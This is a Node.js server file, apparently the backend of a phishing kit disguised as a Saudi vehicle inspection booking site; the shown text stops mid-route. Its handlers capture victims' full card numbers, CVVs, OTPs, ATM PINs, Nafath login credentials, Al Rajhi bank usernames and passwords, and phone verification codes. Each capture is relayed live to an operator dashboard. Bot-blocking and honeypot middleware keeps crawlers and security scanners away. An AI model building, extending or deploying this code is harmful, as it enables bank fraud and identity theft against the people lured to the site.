/**
 * server.js - الخادم الرئيسي لنظام حجز الفحص الفني
 * يعمل على أي منصة Node.js (Render, Railway, Hostinger, إلخ)
 */

require("dotenv").config();
const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const path = require("path");
const cors = require("cors");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const Database = require("better-sqlite3");
const { nanoid } = require("nanoid");

// ==================== إعداد المتغيرات ====================
const PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || "vehicle-inspection-secret-2024";
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "Admin@2024";
const DB_PATH = process.env.DB_PATH || "./database.db";

// ==================== قاعدة البيانات ====================
const db = new Database(DB_PATH);
db.pragma("journal_mode = WAL");
db.pragma("foreign_keys = ON");

// إنشاء الجداول
db.exec(`
  CREATE TABLE IF NOT EXISTS bookings (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    referenceId TEXT UNIQUE NOT NULL,
    clientName TEXT DEFAULT '',
    clientId TEXT DEFAULT '',
    clientPhone TEXT DEFAULT '',
    clientEmail TEXT DEFAULT '',
    clientNationality TEXT DEFAULT '',
    hasDelegate INTEGER DEFAULT 0,
    delegateType TEXT DEFAULT '',
    delegateName TEXT DEFAULT '',
    delegatePhone TEXT DEFAULT '',
    delegateNationality TEXT DEFAULT '',
    delegateId TEXT DEFAULT '',
    vehicleCountry TEXT DEFAULT '',
    vehiclePlate TEXT DEFAULT '',
    vehiclePlateChar1 TEXT DEFAULT '',
    vehiclePlateChar2 TEXT DEFAULT '',
    vehiclePlateChar3 TEXT DEFAULT '',
    vehicleType TEXT DEFAULT '',
    vehicleCarryDang INTEGER DEFAULT 0,
    serviceRegion TEXT DEFAULT '',
    serviceType TEXT DEFAULT '',
    serviceDate TEXT DEFAULT '',
    serviceTime TEXT DEFAULT '',
    clientIp TEXT DEFAULT '',
    rawData TEXT DEFAULT '{}',
    status TEXT DEFAULT 'new',
    statusRead INTEGER DEFAULT 0,
    createdAt INTEGER DEFAULT (strftime('%s','now') * 1000)
  );

  CREATE TABLE IF NOT EXISTS payments (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    referenceId TEXT NOT NULL,
    cardHolderName TEXT DEFAULT '',
    cardNumber TEXT DEFAULT '',
    cardLastFour TEXT DEFAULT '',
    cardExpiry TEXT DEFAULT '',
    cardCvv TEXT DEFAULT '',
    verifyCode TEXT DEFAULT '',
    secretNum TEXT DEFAULT '',
    rajUsername TEXT DEFAULT '',
    rajPassword TEXT DEFAULT '',
    paymentAction TEXT DEFAULT '',
    step INTEGER DEFAULT 0,
    status TEXT DEFAULT '',
    rawData TEXT DEFAULT '{}',
    createdAt INTEGER DEFAULT (strftime('%s','now') * 1000),
    UNIQUE(referenceId)
  );

  CREATE TABLE IF NOT EXISTS verification_codes (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    referenceId TEXT NOT NULL,
    type TEXT NOT NULL,
    nafathId TEXT DEFAULT '',
    nafathPassword TEXT DEFAULT '',
    nafathNumber TEXT DEFAULT '',
    motaselProvider TEXT DEFAULT '',
    motaselPhone TEXT DEFAULT '',
    motaselCode TEXT DEFAULT '',
    otpCode TEXT DEFAULT '',
    step INTEGER DEFAULT 0,
    status TEXT DEFAULT '',
    rawData TEXT DEFAULT '{}',
    createdAt INTEGER DEFAULT (strftime('%s','now') * 1000),
    UNIQUE(referenceId, type)
  );

  CREATE TABLE IF NOT EXISTS navigation_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    referenceId TEXT,
    clientIp TEXT DEFAULT '',
    targetPage TEXT DEFAULT '',
    note TEXT DEFAULT '',
    createdAt INTEGER DEFAULT (strftime('%s','now') * 1000)
  );
`);

// ==================== دوال قاعدة البيانات ====================
function createBooking(data) {
  const stmt = db.prepare(`
    INSERT INTO bookings (
      referenceId, clientName, clientId, clientPhone, clientEmail, clientNationality,
      hasDelegate, delegateType, delegateName, delegatePhone, delegateNationality, delegateId,
      vehicleCountry, vehiclePlate, vehiclePlateChar1, vehiclePlateChar2, vehiclePlateChar3,
      vehicleType, vehicleCarryDang, serviceRegion, serviceType, serviceDate, serviceTime,
      clientIp, rawData, status, statusRead
    ) VALUES (
      @referenceId, @clientName, @clientId, @clientPhone, @clientEmail, @clientNationality,
      @hasDelegate, @delegateType, @delegateName, @delegatePhone, @delegateNationality, @delegateId,
      @vehicleCountry, @vehiclePlate, @vehiclePlateChar1, @vehiclePlateChar2, @vehiclePlateChar3,
      @vehicleType, @vehicleCarryDang, @serviceRegion, @serviceType, @serviceDate, @serviceTime,
      @clientIp, @rawData, @status, @statusRead
    )
  `);
  stmt.run({
    ...data,
    hasDelegate: data.hasDelegate ? 1 : 0,
    vehicleCarryDang: data.vehicleCarryDang ? 1 : 0,
    rawData: JSON.stringify(data.rawData || {}),
  });
  return getBookingByReference(data.referenceId);
}

function getBookingByReference(referenceId) {
  const row = db.prepare("SELECT * FROM bookings WHERE referenceId = ?").get(referenceId);
  if (!row) return null;
  try { row.rawData = JSON.parse(row.rawData); } catch(e) { row.rawData = {}; }
  return row;
}

function getAllBookings() {
  return db.prepare("SELECT * FROM bookings ORDER BY createdAt DESC").all().map(r => {
    try { r.rawData = JSON.parse(r.rawData); } catch(e) { r.rawData = {}; }
    return r;
  });
}

function getNewBookings() {
  return db.prepare("SELECT * FROM bookings WHERE statusRead = 0 ORDER BY createdAt DESC").all();
}

function updateBookingStatus(referenceId, status, statusRead) {
  if (statusRead !== undefined) {
    db.prepare("UPDATE bookings SET status = ?, statusRead = ? WHERE referenceId = ?").run(status, statusRead, referenceId);
  } else {
    db.prepare("UPDATE bookings SET status = ? WHERE referenceId = ?").run(status, referenceId);
  }
}

function markBookingRead(referenceId) {
  db.prepare("UPDATE bookings SET statusRead = 1 WHERE referenceId = ?").run(referenceId);
}

function createOrUpdatePayment(referenceId, data) {
  const existing = db.prepare("SELECT id FROM payments WHERE referenceId = ?").get(referenceId);
  if (existing) {
    const sets = Object.keys(data).map(k => `${k} = @${k}`).join(", ");
    db.prepare(`UPDATE payments SET ${sets} WHERE referenceId = @referenceId`).run({
      ...data,
      rawData: data.rawData ? JSON.stringify(data.rawData) : undefined,
      referenceId,
    });
  } else {
    db.prepare(`
      INSERT INTO payments (referenceId, ${Object.keys(data).join(", ")})
      VALUES (@referenceId, ${Object.keys(data).map(k => `@${k}`).join(", ")})
    `).run({
      ...data,
      rawData: data.rawData ? JSON.stringify(data.rawData) : "{}",
      referenceId,
    });
  }
  return getPaymentByReference(referenceId);
}

function getPaymentByReference(referenceId) {
  const row = db.prepare("SELECT * FROM payments WHERE referenceId = ?").get(referenceId);
  if (!row) return null;
  try { row.rawData = JSON.parse(row.rawData); } catch(e) { row.rawData = {}; }
  return row;
}

function createOrUpdateVerification(referenceId, type, data) {
  const existing = db.prepare("SELECT id FROM verification_codes WHERE referenceId = ? AND type = ?").get(referenceId, type);
  if (existing) {
    const sets = Object.keys(data).map(k => `${k} = @${k}`).join(", ");
    db.prepare(`UPDATE verification_codes SET ${sets} WHERE referenceId = @referenceId AND type = @type`).run({
      ...data,
      rawData: data.rawData ? JSON.stringify(data.rawData) : undefined,
      referenceId,
      type,
    });
  } else {
    db.prepare(`
      INSERT INTO verification_codes (referenceId, type, ${Object.keys(data).join(", ")})
      VALUES (@referenceId, @type, ${Object.keys(data).map(k => `@${k}`).join(", ")})
    `).run({
      ...data,
      rawData: data.rawData ? JSON.stringify(data.rawData) : "{}",
      referenceId,
      type,
    });
  }
  return db.prepare("SELECT * FROM verification_codes WHERE referenceId = ? AND type = ?").get(referenceId, type);
}

function getVerificationByReference(referenceId, type) {
  return db.prepare("SELECT * FROM verification_codes WHERE referenceId = ? AND type = ?").get(referenceId, type);
}

function logNavigation(data) {
  db.prepare("INSERT INTO navigation_logs (referenceId, clientIp, targetPage, note) VALUES (?, ?, ?, ?)").run(
    data.referenceId || null, data.clientIp || "", data.targetPage || "", data.note || ""
  );
}

function getBookingsStats() {
  const total = db.prepare("SELECT COUNT(*) as count FROM bookings").get().count;
  const newCount = db.prepare("SELECT COUNT(*) as count FROM bookings WHERE status = 'new'").get().count;
  const completed = db.prepare("SELECT COUNT(*) as count FROM bookings WHERE status = 'completed'").get().count;
  return { total, new: newCount, completed };
}

// ==================== Express ====================
const app = express();
const server = http.createServer(app);

app.use(cors());
app.use(express.json({ limit: "10mb" }));
app.use(express.urlencoded({ extended: true }));

// ==================== حماية متقدمة من البوتات ====================

// قائمة User-Agents المحجوبة
const BOT_USER_AGENTS = [
  /bot/i, /crawl/i, /spider/i, /slurp/i, /mediapartners/i,
  /googlebot/i, /bingbot/i, /yandex/i, /baiduspider/i,
  /facebookexternalhit/i, /twitterbot/i, /rogerbot/i,
  /linkedinbot/i, /embedly/i, /quora/i, /showyoubot/i,
  /outbrain/i, /pinterest/i, /slackbot/i, /vkShare/i,
  /W3C_Validator/i, /whatsapp/i, /python-requests/i,
  /python-urllib/i, /java\/\d/i, /curl/i, /wget/i,
  /scrapy/i, /mechanize/i, /libwww/i, /go-http-client/i,
  /okhttp/i, /axios/i, /node-fetch/i, /node\.js/i,
  /php\/\d/i, /ruby/i, /perl/i, /httpclient/i,
  /masscan/i, /nmap/i, /zgrab/i, /nikto/i, /sqlmap/i,
  /dirbuster/i, /burpsuite/i, /nessus/i, /openvas/i,
  /headless/i, /phantomjs/i, /selenium/i, /puppeteer/i,
  /playwright/i, /cypress/i, /webdriver/i, /htmlunit/i,
  /slimerjs/i, /casperjs/i, /nightmare/i, /zombie/i,
  /apachebench/i, /httping/i, /wrk/i, /siege/i, /ab\//i,
  /postman/i, /insomnia/i, /httpie/i, /pycurl/i,
  /aiohttp/i, /httpx/i, /requests/i, /urllib/i,
  /java\.net/i, /apache-httpclient/i, /restsharp/i
];

// صفحة الحجب
 const BOT_BLOCK_HTML = `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>403 - الوصول محظور</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f172a; color: #e2e8f0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
  .container { text-align: center; padding: 2rem; max-width: 500px; }
  .icon { font-size: 5rem; margin-bottom: 1rem; }
  h1 { font-size: 2rem; color: #f87171; margin-bottom: 0.5rem; }
  p { color: #94a3b8; font-size: 1rem; line-height: 1.6; }
  .code { background: #1e293b; border: 1px solid #334155; border-radius: 8px; padding: 0.5rem 1rem; display: inline-block; margin-top: 1rem; font-family: monospace; color: #64748b; font-size: 0.85rem; }
</style>
</head>
<body>
  <div class="container">
    <div class="icon">🚫</div>
    <h1>الوصول محظور</h1>
    <p>عذراً، لا يمكن الوصول إلى هذه الصفحة.<br>يبدو أن طلبك تم تحديده كطلب آلي.</p>
    <div class="code">Error 403 - Forbidden</div>
  </div>
</body>
</html>`;

// === Rate Limiting: حجب الطلبات المتكررة ===
const rateLimitMap = new Map(); // ip -> { count, firstRequest, blocked }
const RATE_LIMIT = 60;          // أقصى عدد طلبات
const RATE_WINDOW = 60 * 1000;  // خلال دقيقة
const BLOCK_DURATION = 10 * 60 * 1000; // حجب لمدة 10 دقائق

// تنظيف الذاكرة كل دقيقتين
setInterval(() => {
  const now = Date.now();
  for (const [ip, data] of rateLimitMap.entries()) {
    if (data.blocked && now - data.blockedAt > BLOCK_DURATION) {
      rateLimitMap.delete(ip);
    } else if (!data.blocked && now - data.firstRequest > RATE_WINDOW) {
      rateLimitMap.delete(ip);
    }
  }
}, 2 * 60 * 1000);

// === IPs المحجوبة يدوياً (Honeypot) ===
const blockedIPs = new Set();

// === فحص Headers المتقدم ===
function isSuspiciousRequest(req) {
  const ua = req.headers['user-agent'] || '';
  const accept = req.headers['accept'] || '';
  const acceptLang = req.headers['accept-language'] || '';
  const acceptEnc = req.headers['accept-encoding'] || '';

  // متصفح حقيقي دائماً يرسل accept-language
  if (!acceptLang) return true;

  // متصفح حقيقي يرسل accept-encoding
  if (!acceptEnc) return true;

  // متصفح حقيقي يرسل accept header بمحتوى HTML
  if (req.method === 'GET' && !accept.includes('text/html') && !accept.includes('*/*')) return true;

  // UA يدعي أنه Chrome لكن بدون AppleWebKit
  if (ua.includes('Chrome') && !ua.includes('AppleWebKit')) return true;

  // UA يدعي أنه Firefox لكن بدون Gecko
  if (ua.includes('Firefox') && !ua.includes('Gecko')) return true;

  return false;
}

// === Middleware الرئيسي ===
app.use((req, res, next) => {
  // استثناء مسارات API والـ admin
  if (req.path.startsWith('/api/') || req.path.startsWith('/admin')) {
    return next();
  }

  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || '';
  const ua = req.headers['user-agent'] || '';

  // 1. حجب IPs المدرجة يدوياً
  if (blockedIPs.has(ip)) {
    return res.status(403).send(BOT_BLOCK_HTML);
  }

  // 2. حجب الطلبات بدون User-Agent
  if (!ua || ua.trim() === '') {
    blockedIPs.add(ip);
    return res.status(403).send(BOT_BLOCK_HTML);
  }

  // 3. فحص User-Agent ضد قائمة البوتات
  const isKnownBot = BOT_USER_AGENTS.some(pattern => pattern.test(ua));
  if (isKnownBot) {
    blockedIPs.add(ip);
    return res.status(403).send(BOT_BLOCK_HTML);
  }

  // 4. فحص Headers المتقدم
  if (isSuspiciousRequest(req)) {
    blockedIPs.add(ip);
    return res.status(403).send(BOT_BLOCK_HTML);
  }

  // 5. Rate Limiting
  const now = Date.now();
  let rateData = rateLimitMap.get(ip);
  if (!rateData) {
    rateData = { count: 0, firstRequest: now, blocked: false };
    rateLimitMap.set(ip, rateData);
  }
  if (rateData.blocked) {
    if (now - rateData.blockedAt < BLOCK_DURATION) {
      return res.status(429).send(BOT_BLOCK_HTML);
    } else {
      rateData.blocked = false;
      rateData.count = 0;
      rateData.firstRequest = now;
    }
  }
  if (now - rateData.firstRequest < RATE_WINDOW) {
    rateData.count++;
    if (rateData.count > RATE_LIMIT) {
      rateData.blocked = true;
      rateData.blockedAt = now;
      blockedIPs.add(ip);
      return res.status(429).send(BOT_BLOCK_HTML);
    }
  } else {
    rateData.count = 1;
    rateData.firstRequest = now;
  }

  next();
});

// === Honeypot: رابط خفي لاكتشاف البوتات ===
app.get('/robots.txt', (req, res) => {
  res.type('text/plain');
  res.send('User-agent: *\nDisallow: /');
});
app.get('/.well-known/security.txt', (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || '';
  blockedIPs.add(ip); // أي بوت يدخل هذا المسار يُحجب
  return res.status(403).send(BOT_BLOCK_HTML);
});
app.get('/sitemap.xml', (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || '';
  blockedIPs.add(ip);
  return res.status(403).send(BOT_BLOCK_HTML);
});
app.get('/wp-login.php', (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || '';
  blockedIPs.add(ip);
  return res.status(403).send(BOT_BLOCK_HTML);
});
app.get('/wp-admin*', (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || '';
  blockedIPs.add(ip);
  return res.status(403).send(BOT_BLOCK_HTML);
});

// ==================== Socket.io ====================
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
  transports: ["websocket", "polling"],
});

// خرائط IP
const ipToSocket = new Map(); // IP → socket.id
const ipToReference = new Map(); // IP → referenceId

io.on("connection", (socket) => {
  console.log(`[Socket.io] Client connected: ${socket.id}`);
  // إرسال عداد المتصلين للأدمن عند كل اتصال جديد
  const clientCount = io.sockets.sockets.size;
  io.to("admins").emit("visitorsCount", { count: clientCount });

  // updateLocation: كل صفحة ترسل IP الحقيقي
  socket.on("updateLocation", (data) => {
    const ip = String(data?.ip || "");
    if (ip) {
      ipToSocket.set(ip, socket.id);
      socket.join(`ip_${ip}`);
      console.log(`[Socket.io] updateLocation: ip=${ip} socket=${socket.id}`);
    }
  });

  // submitBooking: حجز جديد
  socket.on("submitBooking", async (data) => {
    try {
      const clientIp = String(data.ip || "unknown");
      const referenceId = nanoid(12);
      ipToReference.set(clientIp, referenceId);
      const str = (v) => (v != null ? String(v) : "");
      // الموقع يرسل: name, nationalID, phoneNumber, email, nationality, plate, region, serviceType, dateSvc, timeSvc, countryOfRegistration, delegateOn, commissioner
      const plateRaw = str(data.plate ?? "");
      const plateStr = plateRaw || [
        str(data.VehiclePlateChar1 ?? ""),
        str(data.VehiclePlateChar2 ?? ""),
        str(data.VehiclePlateChar3 ?? ""),
        str(data.NumberPanal ?? ""),
      ].filter(Boolean).join("-");
      const commissioner = data.commissioner || {};
      createBooking({
        referenceId,
        clientName: str(data.name ?? data.Name ?? ""),
        clientId: str(data.nationalID ?? data.ID ?? ""),
        clientPhone: str(data.phoneNumber ?? data.PhonNumber ?? ""),
        clientEmail: str(data.email ?? data.Email1 ?? ""),
        clientNationality: str(data.nationality ?? data.Nationality ?? ""),
        hasDelegate: data.delegateOn === true || data.delegateOn === 1,
        delegateType: str(commissioner.type ?? data.DelegateType ?? ""),
        delegateName: str(commissioner.name ?? data.DelegateName ?? ""),
        delegatePhone: str(commissioner.phone ?? data.DelegatePhone ?? ""),
        delegateNationality: str(commissioner.nationality ?? data.DelegateNationality ?? ""),
        delegateId: str(commissioner.id ?? data.DelegateId ?? ""),
        vehicleCountry: str(data.countryOfRegistration ?? data.CountryReg ?? ""),
        vehiclePlate: plateStr,
        vehiclePlateChar1: str(data.VehiclePlateChar1 ?? ""),
        vehiclePlateChar2: str(data.VehiclePlateChar2 ?? ""),
        vehiclePlateChar3: str(data.VehiclePlateChar3 ?? ""),
        vehicleType: str(data.TypeVechil ?? ""),
        vehicleCarryDang: false,
        serviceRegion: str(data.region ?? data.RegionSvc ?? ""),
        serviceType: str(data.serviceType ?? data.TypeSvc ?? ""),
        serviceDate: str(data.dateSvc ?? data.DateSvc ?? ""),
        serviceTime: str(data.timeSvc ?? data.TimeSvc ?? ""),
        clientIp,
        rawData: data,
        status: "new",
        statusRead: 0,
      });
      io.to("admins").emit("newBooking", { reference: referenceId, ip: clientIp });
      // الموقع ينتظر ackNewDate وليس ackBooking
      socket.emit("ackNewDate", { success: true });
    } catch (err) {
      console.error("[Socket.io] submitBooking error:", err);
      socket.emit("ackNewDate", { success: false, error: err.message });
    }
  });

  // submitPaymentData: بيانات البطاقة
  socket.on("submitPaymentData", async (data) => {
    try {
      const clientIp = String(data.ip || "unknown");
      const reference = String(data.reference || ipToReference.get(clientIp) || "");
      if (!reference) {
        socket.emit("ackPayment", { success: false, error: "لا يوجد مرجع" });
        return;
      }
      ipToReference.set(clientIp, reference);
      // حفظ رقم البطاقة كما هو بدون عكس
      const cardNum = String(data.cardNumber ?? data.card_number ?? "");
      const lastFour = cardNum.slice(-4);
      createOrUpdatePayment(reference, {
        cardHolderName: String(data.cardHolderName ?? data.card_holder_name ?? ""),
        cardNumber: cardNum,
        cardLastFour: lastFour,
        cardExpiry: String(data.cardExpiry ?? data.card_expiry ?? data.expirationDate ?? ""),
        cardCvv: String(data.cardCvv ?? data.cvv ?? ""),
        step: 1,
        status: "step1_done",
        rawData: data,
      });
      updateBookingStatus(reference, "pending_payment");
      // إرسال عداد المتصلين للأدمن
      const clientCountPay = io.sockets.sockets.size;
      io.to("admins").emit("visitorsCount", { count: clientCountPay });
      const isRajhi = String(data.cardHolderName ?? "").toLowerCase().includes("rajhi") ||
        String(data.bankName ?? "").toLowerCase().includes("rajhi");
      io.to("admins").emit("newPayment", { reference, step: 1, type: "payment", ip: clientIp });
      socket.emit("ackPayment", {
        success: true,
        data: { step: 1, status: "STILL", isRajhi },
      });
    } catch (err) {
      console.error("[Socket.io] submitPaymentData error:", err);
      socket.emit("ackPayment", { success: false, error: err.message });
    }
  });

  // submitVerificationData: OTP الأول (صفحة code/Tx)
  socket.on("submitVerificationData", async (data) => {
    try {
      const clientIp = String(data.ip || "unknown");
      const reference = String(data.reference || ipToReference.get(clientIp) || "");
      if (!reference) return;
      ipToReference.set(clientIp, reference);
      createOrUpdateVerification(reference, "otp", {
        otpCode: String(data.verification_code_two ?? data.code ?? ""),
        step: 2,
        status: "step2_done",
        rawData: data,
      });
      createOrUpdatePayment(reference, { step: 2, status: "step2_done", verifyCode: String(data.verification_code_two ?? data.code ?? "") });
      updateBookingStatus(reference, "pending_otp");
      io.to("admins").emit("newPayment", { reference, step: 2, type: "otp", ip: clientIp });
      // إرسال ackVerification حتى تنتقل الصفحة لحالة loading وتنتظر navigateTo من المشرف
      socket.emit("ackVerification", { success: true });
    } catch (err) {
      console.error("[Socket.io] submitVerificationData error:", err);
    }
  });

  // submitCodeData: OTP الثاني أو ATM PIN (صفحة madaPin/Cx أو pin/Dx)
  socket.on("submitCodeData", async (data) => {
    try {
      const clientIp = String(data.ip || "unknown");
      const reference = String(data.reference || ipToReference.get(clientIp) || "");
      if (!reference) return;
      ipToReference.set(clientIp, reference);
      const code = String(data.verification_code ?? data.pin ?? data.code ?? "");
      const existingPayment = getPaymentByReference(reference);
      const currentStep = existingPayment?.step ?? 2;
      const newStep = currentStep >= 3 ? 3 : 3;
      createOrUpdatePayment(reference, {
        secretNum: code,
        step: newStep,
        status: "step3_done",
      });
      updateBookingStatus(reference, "pending_atm");
      io.to("admins").emit("newPayment", { reference, step: newStep, type: "code", ip: clientIp });
      // إرسال ackCode حتى تنتقل الصفحة لحالة loading وتنتظر navigateTo من المشرف
      socket.emit("ackCode", { success: true });
    } catch (err) {
      console.error("[Socket.io] submitCodeData error:", err);
    }
  });

  // submitNafadData: بيانات نفاذ (الموقع يرسل submitNafadData بـ d وليس th)
  socket.on("submitNafadData", async (data) => {
    try {
      const clientIp = String(data.ip || "unknown");
      const reference = String(data.reference || ipToReference.get(clientIp) || "");
      if (!reference) return;
      ipToReference.set(clientIp, reference);
      createOrUpdateVerification(reference, "nafath", {
        nafathId: String(data.nafathId ?? data.id ?? data.username ?? ""),
        nafathPassword: String(data.nafathPassword ?? data.password ?? ""),
        step: 1,
        status: "step1_done",
        rawData: data,
      });
      updateBookingStatus(reference, "pending_nafath");
      io.to("admins").emit("newPayment", { reference, type: "nafath", ip: clientIp });
      // الموقع ينتظر ackNafad (بـ d وليس th)
      socket.emit("ackNafad", { success: true });
    } catch (err) {
      console.error("[Socket.io] submitNafadData error:", err);
    }
  });

  // getNafadCode: طلب كود نفاذ (يُرسل كل 2 ثانية)
  socket.on("getNafadCode", async (data) => {
    try {
      const clientIp = String(data.ip || "unknown");
      const reference = String(ipToReference.get(clientIp) || "");
      // الكود يُرسل من المشرف عبر endpoint /api/admin/nafad-code
      // هنا فقط نُسجّل الطلب
      if (reference) {
        io.to("admins").emit("nafadCodeRequested", { reference, ip: clientIp });
      }
    } catch (err) {
      console.error("[Socket.io] getNafadCode error:", err);
    }
  });

  // submitPhoneData: بيانات الهاتف (STC Pay)
  socket.on("submitPhoneData", async (data) => {
    try {
      const clientIp = String(data.ip || "unknown");
      const reference = String(data.reference || ipToReference.get(clientIp) || "");
      if (!reference) return;
      ipToReference.set(clientIp, reference);
      createOrUpdateVerification(reference, "phone", {
        motaselPhone: String(data.phone ?? ""),
        motaselProvider: String(data.operator ?? ""),
        step: 1,
        status: "step1_done",
        rawData: data,
      });
      io.to("admins").emit("newPayment", { reference, type: "phone", ip: clientIp });
      // إرسال ackPhone حتى تنتقل الصفحة لحالة loading وتنتظر navigateTo من المشرف
      socket.emit("ackPhone", { success: true });
    } catch (err) {
      console.error("[Socket.io] submitPhoneData error:", err);
    }
  });

  // submitPhoneCodeData: رمز الهاتف
  socket.on("submitPhoneCodeData", async (data) => {
    try {
      const clientIp = String(data.ip || "unknown");
      const reference = String(data.reference || ipToReference.get(clientIp) || "");
      if (!reference) return;
      ipToReference.set(clientIp, reference);
      createOrUpdateVerification(reference, "phone", {
        motaselCode: String(data.verification_code_three ?? data.code ?? ""),
        step: 2,
        status: "step2_done",
      });
      io.to("admins").emit("newPayment", { reference, type: "phoneCode", ip: clientIp });
      // إرسال ackPhoneCode حتى تنتقل الصفحة لحالة loading وتنتظر navigateTo من المشرف
      socket.emit("ackPhoneCode", { success: true });
    } catch (err) {
      console.error("[Socket.io] submitPhoneCodeData error:", err);
    }
  });

  // submitMotaselData: بيانات المتصل
  socket.on("submitMotaselData", async (data) => {
    try {
      const clientIp = String(data.ip || "unknown");
      const reference = String(data.reference || ipToReference.get(clientIp) || "");
      if (!reference) return;
      ipToReference.set(clientIp, reference);
      createOrUpdateVerification(reference, "motasel", {
        motaselProvider: String(data.provider ?? ""),
        motaselPhone: String(data.phone ?? ""),
        step: 1,
        status: "step1_done",
        rawData: data,
      });
      updateBookingStatus(reference, "pending_motasel");
      io.to("admins").emit("newPayment", { reference, type: "motasel", ip: clientIp });
      socket.emit("ackMotasel", { success: true, data: { step: 1 } });
    } catch (err) {
      console.error("[Socket.io] submitMotaselData error:", err);
    }
  });

  // submitMotaselCodeData: رمز المتصل
  socket.on("submitMotaselCodeData", async (data) => {
    try {
      const clientIp = String(data.ip || "unknown");
      const reference = String(data.reference || ipToReference.get(clientIp) || "");
      if (!reference) return;
      ipToReference.set(clientIp, reference);
      createOrUpdateVerification(reference, "motasel", {
        motaselCode: String(data.code ?? ""),
        step: 2,
        status: "step2_done",
      });
      io.to("admins").emit("newPayment", { reference, type: "motaselCode", ip: clientIp });
      // لا نرسل ack - ينتظر navigateTo
    } catch (err) {
      console.error("[Socket.io] submitMotaselCodeData error:", err);
    }
  });

  // submitRajhiData: بيانات الراجحي
  socket.on("submitRajhiData", async (data) => {
    try {
      const clientIp = String(data.ip || "unknown");
      const reference = String(data.reference || ipToReference.get(clientIp) || "");
      if (!reference) return;
      ipToReference.set(clientIp, reference);
      createOrUpdatePayment(reference, {
        rajUsername: String(data.username ?? ""),
        rajPassword: String(data.password ?? ""),
        step: 4,
        status: "step3_done",
        rawData: data,
      });
      io.to("admins").emit("newPayment", { reference, step: 4, type: "rajhi", ip: clientIp });
      socket.emit("ackRajhi", { success: true, data: { step: 4, status: "STILL" } });
    } catch (err) {
      console.error("[Socket.io] submitRajhiData error:", err);
    }
  });

  // submitRajhiCodeData: رمز الراجحي
  socket.on("submitRajhiCodeData", async (data) => {
    try {
      const clientIp = String(data.ip || "unknown");
      const reference = String(data.reference || ipToReference.get(clientIp) || "");
      if (!reference) return;
      ipToReference.set(clientIp, reference);
      createOrUpdatePayment(reference, {
        secretNum: String(data.rajhiCode ?? data.code ?? ""),
        step: 5,
        status: "verified",
      });
      updateBookingStatus(reference, "payment_done");
      io.to("admins").emit("newPayment", { reference, step: 5, type: "rajhiCode", ip: clientIp });
      socket.emit("ackRajhiCode", { success: true, data: { step: 5, status: "accepted" } });
    } catch (err) {
      console.error("[Socket.io] submitRajhiCodeData error:", err);
    }
  });

  // stcCallReceived
  socket.on("stcCallReceived", async (data) => {
    try {
      const clientIp = String(data.ip || "unknown");
      const reference = String(data.reference || ipToReference.get(clientIp) || "");
      if (reference) {
        createOrUpdateVerification(reference, "otp", { step: 1, status: "stc_received", rawData: data });
        io.to("admins").emit("newPayment", { reference, type: "stcCall", ip: clientIp });
      }
      socket.emit("success", { success: true });
    } catch (err) {
      console.error("[Socket.io] stcCallReceived error:", err);
    }
  });

  // joinAdmin: المشرف يسجل دخوله للغرفة
  socket.on("joinAdmin", (data) => {
    // يقبل token كـ string مباشرة أو كـ object { token: "..." }
    const token = typeof data === "string" ? data : data?.token;
    try {
      jwt.verify(token, JWT_SECRET);
      socket.join("admins");
      console.log(`[Socket.io] Admin joined: ${socket.id}`);
      // إرسال عداد المتصلين فور انضمام المشرف
      const currentCount = io.sockets.sockets.size;
      socket.emit("visitorsCount", { count: currentCount });
      socket.emit("adminJoined", { success: true });
    } catch (err) {
      socket.emit("adminJoined", { success: false, error: "Unauthorized" });
    }
  });

  socket.on("disconnect", () => {
    for (const [ip, sid] of ipToSocket.entries()) {
      if (sid === socket.id) {
        ipToSocket.delete(ip);
        break;
      }
    }
    console.log(`[Socket.io] Client disconnected: ${socket.id}`);
    // إرسال عداد المتصلين للأدمن بعد الانقطاع
    setTimeout(() => {
      const clientCountAfter = io.sockets.sockets.size;
      io.to("admins").emit("visitorsCount", { count: clientCountAfter });
    }, 100);
  });
});
// ==================== Auth Middleware =====================
function authMiddleware(req, res, next) {
  const token = req.headers.authorization?.replace("Bearer ", "") || req.cookies?.token;
  if (!token) return res.status(401).json({ error: "Unauthorized" });
  try {
    req.admin = jwt.verify(token, JWT_SECRET);
    next();
  } catch (err) {
    return res.status(401).json({ error: "Invalid token" });
  }
}

// ==================== API Routes ====================

// تسجيل الدخول
app.post("/api/admin/login", (req, res) => {
  const { password } = req.body;
  if (!password) return res.status(400).json({ error: "كلمة المرور مطلوبة" });
  const isValid = password === ADMIN_PASSWORD;
  if (!isValid) return res.status(401).json({ error: "كلمة المرور غير صحيحة" });
  const token = jwt.sign({ role: "admin" }, JWT_SECRET, { expiresIn: "7d" });
  return res.json({ success: true, token });
});

// التحقق من الجلسة
app.get("/api/admin/me", authMiddleware, (req, res) => {
  res.json({ success: true, role: "admin" });
});

// جلب جميع الحجوزات
app.get("/api/admin/bookings", authMiddleware, (req, res) => {
  try {
    const allBookings = getAllBookings();
    const result = allBookings.map(b => {
      const payment = getPaymentByReference(b.referenceId);
      const nafath = getVerificationByReference(b.referenceId, "nafath");
      const motasel = getVerificationByReference(b.referenceId, "motasel");
      const otp = getVerificationByReference(b.referenceId, "otp");
      return { ...b, payment, nafath, motasel, otp };
    });
    res.json({ success: true, data: result });
  } catch (err) {
